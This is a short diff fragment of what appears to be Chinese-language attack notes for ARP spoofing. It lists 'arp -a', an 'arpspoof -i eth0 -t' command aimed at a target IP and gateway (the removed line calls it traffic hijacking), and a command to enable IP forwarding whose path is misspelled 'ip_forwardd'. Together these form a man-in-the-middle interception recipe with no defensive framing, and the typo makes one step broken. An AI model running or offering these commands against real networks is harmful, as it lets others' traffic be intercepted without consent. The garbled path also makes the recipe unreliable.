@@ -3,7 +3,7 @@
 
 arp -a
 
-arpspoof进行流量劫持  arpspoof -i eth0 -t 目标IP 目标网关IP
+arpspoof -i eth0 -t 目标IP 目标网关IP
 
 echo 1 > /proc/sys/net/ipv4/ip_forwardd
 
